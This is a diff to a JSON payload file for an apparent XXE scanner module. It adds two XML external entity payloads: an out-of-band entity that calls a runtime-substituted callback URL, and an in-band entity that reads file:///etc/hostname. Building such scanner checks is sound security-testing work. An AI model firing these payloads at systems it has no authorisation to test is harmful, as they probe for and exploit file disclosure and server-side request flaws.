@@ -1,7 +1,20 @@
 {
   "_file_type": "injectable_payload",
   "_scanner": "xxe_scanner",
-  "_notes": "OOB DTD, file read, SSRF via XXE",
-  "_status": "STUB -- Week 0 scaffolding per Section 3.1; real payloads added Week 7 alongside xxe_scanner",
-  "payloads": []
+  "_notes": "OOB DTD + hostname read",
+  "_status": "Real payloads added Week 7 Batch 2 (docs/DECISIONS.md item 85). Schema: id, technique ('oob' | 'in_band_file_read'), payload (literal, in_band_file_read) or payload_template (runtime-substituted with {oob_url}, the oob entry), expected. Exactly two entries -- Section 7.9's own text names exactly two techniques ('OOB DTD callback AND/OR /etc/hostname file read'); no additional structural DTD variants invented -- see xxe_scanner.py module docstring.",
+  "payloads": [
+    {
+      "id": "oob_dtd_callback",
+      "technique": "oob",
+      "payload_template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{oob_url}/\">]><foo>&xxe;</foo>",
+      "expected": "Interactsh callback received (Section 7.9: 'OOB DTD callback'). {oob_url} substituted at runtime from InteractshClient.register_probe()."
+    },
+    {
+      "id": "etc_hostname_file_read",
+      "technique": "in_band_file_read",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
+      "expected": "Response body contains /etc/hostname's content, checked via content_heuristics.looks_like_hostname_content (Section 7.9: '/etc/hostname file read'; Section 7.10's same technique, shared helper)."
+    }
+  ]
 }
